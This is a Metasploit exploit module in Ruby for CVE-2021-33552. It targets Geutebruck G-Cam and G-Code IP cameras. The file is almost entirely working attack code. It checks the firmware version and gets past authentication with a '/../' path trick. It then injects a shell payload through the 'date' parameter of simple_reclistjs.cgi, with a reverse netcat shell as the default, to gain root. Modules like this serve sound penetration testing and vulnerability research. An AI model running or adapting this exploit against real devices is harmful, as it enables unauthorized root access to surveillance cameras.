##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Geutebruck simple_reclistjs.cgi Remote Command Execution',
        'Description' => %q{
          This module bypass & exploits an authenticated arbitrary command execution vulnerability within the 'date'
          GET parameter of the /uapi-cgi/simple_reclistjs.cgi page of Geutebruck G-Cam EEC-2xxx and G-Code EBC-21xx, EFD-22xx,
          ETHC-22xx, and EWPC-22xx devices running firmware versions <= 1.12.0.27 as well as firmware 
          versions 1.12.13.2 and 1.12.14.5.
          Successful exploitation results in remote code execution as the root user.
        },

        'Author' => [
       'Titouan Lazard - RandoriSec', # Discovery
       'Ibrahim Ayadhi - RandoriSec', # Metasploit Module
        ],
        'License' => MSF_LICENSE,
        'References' =>
          [
            ['CVE', 'CVE-2021-33552'],
            [ 'URL', 'http://geutebruck.com' ],
            [ 'URL', 'https://www.randorisec.fr/udp-technology-ip-camera-vulnerabilities/'],
            [ 'URL', 'https://us-cert.cisa.gov/ics/advisories/icsa-21-208-03']
          ],
        'DisclosureDate' => '2021-07-08',
        'Privileged' => true,
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_ARMLE],
        'Targets' => [
          [ 'Automatic Target', {} ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' =>
         {
           'PAYLOAD' => 'cmd/unix/reverse_netcat_gaping'
         }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to the tmpapp page', '/../uapi-cgi/simple_reclistjs.cgi']),
      ]
    )
  end

  def firmware
    begin
      res = send_request_cgi(
        'method' => 'GET',
        'uri' => '/brand.xml'
      )
      unless res
        vprint_error 'Connection failed'
        return CheckCode::Unknown
      end

      res_xml = res.get_xml_document
      @version = res_xml.at('//firmware').text
      return true
    end
  end

  def check
    result = firmware
    return result unless result == true

    version = Gem::Version.new(@version)
    vprint_status "Found Geutebruck version #{version}"
    if version <= Gem::Version.new('1.12.0.27') || version == Gem::Version.new('1.12.13.2') || version == Gem::Version.new('1.12.14.5')
      return CheckCode::Appears
    end

    CheckCode::Safe
  end

  def exploit
    print_status("#{rhost}:#{rport} - Attempting to exploit...")
    uri = "/" + Rex::Text.rand_hostname + target_uri.path
    send_request_cgi(
      {
        'method' => 'GET',
        'uri' => uri,
        'vars_get' => { 'action' => 'get' , 'timekey'=>'2333','date'=> "$(#{payload.encoded})" }
      }
    )
  end
end
